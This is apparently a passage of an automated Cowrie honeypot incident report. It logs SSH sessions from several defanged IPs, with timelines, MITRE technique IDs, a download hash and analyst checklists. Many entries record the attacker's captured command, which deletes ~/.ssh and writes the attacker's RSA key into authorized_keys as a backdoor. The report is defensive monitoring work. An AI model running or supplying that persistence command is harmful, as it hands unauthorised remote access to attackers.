| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:22:28` | `cowrie.session.connect` |
| `2026-06-05 16:22:28` | `cowrie.client.version` |
| `2026-06-05 16:22:28` | `cowrie.client.kex` |
| `2026-06-05 16:22:28` | `cowrie.login.success` |
| `2026-06-05 16:22:28` | `cowrie.session.params` |
| `2026-06-05 16:22:28` | `cowrie.command.input` |
| `2026-06-05 16:22:28` | `cowrie.command.failed` |
| `2026-06-05 16:22:28` | `cowrie.log.closed` |
| `2026-06-05 16:22:28` | `cowrie.session.params` |
| `2026-06-05 16:22:28` | `cowrie.command.input` |
| `2026-06-05 16:22:29` | `cowrie.session.file_download` |
| `2026-06-05 16:22:29` | `cowrie.log.closed` |
| `2026-06-05 16:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.79.124[.]231` to AbuseIPDB if not already reported
- [ ] Block `47.79.124[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ed5980e0c5

| Field | Detail |
|---|---|
| **Source IP** | `47.79.124[.]231` |
| **First Seen** | 2026-06-05 16:22 |
| **Last Seen** | 2026-06-05 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:22:30` | `cowrie.session.connect` |
| `2026-06-05 16:22:30` | `cowrie.client.version` |
| `2026-06-05 16:22:30` | `cowrie.client.kex` |
| `2026-06-05 16:22:30` | `cowrie.login.success` |
| `2026-06-05 16:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.79.124[.]231` to AbuseIPDB if not already reported
- [ ] Block `47.79.124[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7fd2fe9af7

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:23 |
| **Last Seen** | 2026-06-05 16:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:23:01` | `cowrie.session.connect` |
| `2026-06-05 16:23:01` | `cowrie.client.version` |
| `2026-06-05 16:23:01` | `cowrie.client.kex` |
| `2026-06-05 16:23:02` | `cowrie.login.success` |
| `2026-06-05 16:23:03` | `cowrie.session.params` |
| `2026-06-05 16:23:03` | `cowrie.command.input` |
| `2026-06-05 16:23:03` | `cowrie.command.failed` |
| `2026-06-05 16:23:03` | `cowrie.log.closed` |
| `2026-06-05 16:23:04` | `cowrie.session.params` |
| `2026-06-05 16:23:04` | `cowrie.command.input` |
| `2026-06-05 16:23:04` | `cowrie.session.file_download` |
| `2026-06-05 16:23:04` | `cowrie.log.closed` |
| `2026-06-05 16:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae568b9b4b7a

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:23 |
| **Last Seen** | 2026-06-05 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:23:07` | `cowrie.session.connect` |
| `2026-06-05 16:23:07` | `cowrie.client.version` |
| `2026-06-05 16:23:07` | `cowrie.client.kex` |
| `2026-06-05 16:23:08` | `cowrie.login.success` |
| `2026-06-05 16:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223e408ec5f1

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:23 |
| **Last Seen** | 2026-06-05 16:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:23:46` | `cowrie.session.connect` |
| `2026-06-05 16:23:46` | `cowrie.client.version` |
| `2026-06-05 16:23:46` | `cowrie.client.kex` |
| `2026-06-05 16:23:46` | `cowrie.login.success` |
| `2026-06-05 16:23:46` | `cowrie.session.params` |
| `2026-06-05 16:23:46` | `cowrie.command.input` |
| `2026-06-05 16:23:46` | `cowrie.command.failed` |
| `2026-06-05 16:23:46` | `cowrie.log.closed` |
| `2026-06-05 16:23:47` | `cowrie.session.params` |
| `2026-06-05 16:23:47` | `cowrie.command.input` |
| `2026-06-05 16:23:47` | `cowrie.session.file_download` |
| `2026-06-05 16:23:47` | `cowrie.log.closed` |
| `2026-06-05 16:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6235fef908c

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:23 |
| **Last Seen** | 2026-06-05 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:23:48` | `cowrie.session.connect` |
| `2026-06-05 16:23:48` | `cowrie.client.version` |
| `2026-06-05 16:23:48` | `cowrie.client.kex` |
| `2026-06-05 16:23:48` | `cowrie.login.success` |
| `2026-06-05 16:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2d8bc2bc82

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:25 |
| **Last Seen** | 2026-06-05 16:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:25:21` | `cowrie.session.connect` |
| `2026-06-05 16:25:21` | `cowrie.client.version` |
| `2026-06-05 16:25:22` | `cowrie.client.kex` |
| `2026-06-05 16:25:23` | `cowrie.login.success` |
| `2026-06-05 16:25:23` | `cowrie.session.params` |
| `2026-06-05 16:25:23` | `cowrie.command.input` |
| `2026-06-05 16:25:23` | `cowrie.command.failed` |
| `2026-06-05 16:25:24` | `cowrie.log.closed` |
| `2026-06-05 16:25:24` | `cowrie.session.params` |
| `2026-06-05 16:25:24` | `cowrie.command.input` |
| `2026-06-05 16:25:24` | `cowrie.session.file_download` |
| `2026-06-05 16:25:24` | `cowrie.log.closed` |
| `2026-06-05 16:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9407d920edac

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:25 |
| **Last Seen** | 2026-06-05 16:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:25:27` | `cowrie.session.connect` |
| `2026-06-05 16:25:28` | `cowrie.client.version` |
| `2026-06-05 16:25:28` | `cowrie.client.kex` |
| `2026-06-05 16:25:29` | `cowrie.login.success` |
| `2026-06-05 16:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8baef45d374

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:25 |
| **Last Seen** | 2026-06-05 16:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:25:46` | `cowrie.session.connect` |
| `2026-06-05 16:25:46` | `cowrie.client.version` |
| `2026-06-05 16:25:46` | `cowrie.client.kex` |
| `2026-06-05 16:25:46` | `cowrie.login.success` |
| `2026-06-05 16:25:47` | `cowrie.session.params` |
| `2026-06-05 16:25:47` | `cowrie.command.input` |
| `2026-06-05 16:25:47` | `cowrie.command.failed` |
| `2026-06-05 16:25:47` | `cowrie.log.closed` |
| `2026-06-05 16:25:47` | `cowrie.session.params` |
| `2026-06-05 16:25:47` | `cowrie.command.input` |
| `2026-06-05 16:25:47` | `cowrie.session.file_download` |
| `2026-06-05 16:25:47` | `cowrie.log.closed` |
| `2026-06-05 16:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e597320d623e

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:25 |
| **Last Seen** | 2026-06-05 16:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:25:48` | `cowrie.session.connect` |
| `2026-06-05 16:25:48` | `cowrie.client.version` |
| `2026-06-05 16:25:48` | `cowrie.client.kex` |
| `2026-06-05 16:25:49` | `cowrie.login.success` |
| `2026-06-05 16:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e2af4f4e38

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:26 |
| **Last Seen** | 2026-06-05 16:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:26:28` | `cowrie.session.connect` |
| `2026-06-05 16:26:28` | `cowrie.client.version` |
| `2026-06-05 16:26:29` | `cowrie.client.kex` |
| `2026-06-05 16:26:30` | `cowrie.login.success` |
| `2026-06-05 16:26:30` | `cowrie.session.params` |
| `2026-06-05 16:26:30` | `cowrie.command.input` |
| `2026-06-05 16:26:30` | `cowrie.command.failed` |
| `2026-06-05 16:26:31` | `cowrie.log.closed` |
| `2026-06-05 16:26:31` | `cowrie.session.params` |
| `2026-06-05 16:26:31` | `cowrie.command.input` |
| `2026-06-05 16:26:31` | `cowrie.session.file_download` |
| `2026-06-05 16:26:31` | `cowrie.log.closed` |
| `2026-06-05 16:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d659e9a0e5

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:26 |
| **Last Seen** | 2026-06-05 16:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:26:35` | `cowrie.session.connect` |
| `2026-06-05 16:26:35` | `cowrie.client.version` |
| `2026-06-05 16:26:35` | `cowrie.client.kex` |
| `2026-06-05 16:26:37` | `cowrie.login.success` |
| `2026-06-05 16:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ce118c13a9a

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:27 |
| **Last Seen** | 2026-06-05 16:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:27:30` | `cowrie.session.connect` |
| `2026-06-05 16:27:30` | `cowrie.client.version` |
| `2026-06-05 16:27:30` | `cowrie.client.kex` |
| `2026-06-05 16:27:31` | `cowrie.login.success` |
| `2026-06-05 16:27:32` | `cowrie.session.params` |
| `2026-06-05 16:27:32` | `cowrie.command.input` |
| `2026-06-05 16:27:32` | `cowrie.command.failed` |
| `2026-06-05 16:27:32` | `cowrie.log.closed` |
| `2026-06-05 16:27:32` | `cowrie.session.params` |
| `2026-06-05 16:27:32` | `cowrie.command.input` |
| `2026-06-05 16:27:33` | `cowrie.session.file_download` |
| `2026-06-05 16:27:33` | `cowrie.log.closed` |
| `2026-06-05 16:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74f6ef8f3fd

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:27 |
| **Last Seen** | 2026-06-05 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:27:36` | `cowrie.session.connect` |
| `2026-06-05 16:27:36` | `cowrie.client.version` |
| `2026-06-05 16:27:36` | `cowrie.client.kex` |
| `2026-06-05 16:27:37` | `cowrie.login.success` |
| `2026-06-05 16:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb8b969f9b7

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:28 |
| **Last Seen** | 2026-06-05 16:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:28:12` | `cowrie.session.connect` |
| `2026-06-05 16:28:12` | `cowrie.client.version` |
| `2026-06-05 16:28:14` | `cowrie.client.kex` |
| `2026-06-05 16:28:15` | `cowrie.login.success` |
| `2026-06-05 16:28:15` | `cowrie.session.params` |
| `2026-06-05 16:28:15` | `cowrie.command.input` |
| `2026-06-05 16:28:15` | `cowrie.command.failed` |
| `2026-06-05 16:28:16` | `cowrie.log.closed` |
| `2026-06-05 16:28:16` | `cowrie.session.params` |
| `2026-06-05 16:28:16` | `cowrie.command.input` |
| `2026-06-05 16:28:17` | `cowrie.session.file_download` |
| `2026-06-05 16:28:17` | `cowrie.log.closed` |
| `2026-06-05 16:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc4c5ae63a2

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:28 |
| **Last Seen** | 2026-06-05 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:28:20` | `cowrie.session.connect` |
| `2026-06-05 16:28:20` | `cowrie.client.version` |
| `2026-06-05 16:28:20` | `cowrie.client.kex` |
| `2026-06-05 16:28:21` | `cowrie.login.success` |
| `2026-06-05 16:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f45d7bf252e

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:28 |
| **Last Seen** | 2026-06-05 16:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:28:48` | `cowrie.session.connect` |
| `2026-06-05 16:28:48` | `cowrie.client.version` |
| `2026-06-05 16:28:48` | `cowrie.client.kex` |
| `2026-06-05 16:28:49` | `cowrie.login.success` |
| `2026-06-05 16:28:49` | `cowrie.session.params` |
| `2026-06-05 16:28:49` | `cowrie.command.input` |
| `2026-06-05 16:28:49` | `cowrie.command.failed` |
| `2026-06-05 16:28:50` | `cowrie.log.closed` |
| `2026-06-05 16:28:50` | `cowrie.session.params` |
| `2026-06-05 16:28:50` | `cowrie.command.input` |
| `2026-06-05 16:28:50` | `cowrie.session.file_download` |
| `2026-06-05 16:28:50` | `cowrie.log.closed` |
| `2026-06-05 16:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11e27a0c988

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:28 |
| **Last Seen** | 2026-06-05 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
